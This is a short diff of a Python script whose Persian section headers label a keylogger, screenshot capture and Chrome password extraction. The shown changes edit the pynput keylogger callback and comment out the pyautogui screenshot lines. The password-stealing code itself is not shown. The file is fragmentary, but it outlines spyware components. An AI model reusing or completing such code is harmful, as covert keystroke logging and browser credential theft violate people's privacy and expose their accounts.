@@ -1,6 +1,6 @@
 # -----------------کی لاگر-------------
 # pip install pynput
-from pynput.keyboard import Listener, Key
+from pynput.keyboard import Listener
 from datetime import datetime, timedelta
 
 special_keys = {"Key.space": "[Space]", "Key.enter": "[Enter]", "<98>": "2", "Key.tab": "[Tab]","Key.ctrl_l": "[LCtrl]"}
@@ -18,7 +18,7 @@ start = datetime.now()
 end = start + timedelta(seconds=5)
 
 
-def on_release(key):
+def on_release():
     if datetime.now() >= end:
         return False
 
@@ -39,9 +39,9 @@ cv2.destroyAllWindows()
 
 # ----------------------اسکرین شات---------------------
 # pip install pyautogui
-import pyautogui
-my_screenshot = pyautogui.screenshot()
-my_screenshot.save("screenshot.png")
+# import pyautogui
+# my_screenshot = pyautogui.screenshot()
+# my_screenshot.save("screenshot.png")
 
 # ----------------------پسورد های کروم---------------------
 # pip install pycryptodomex
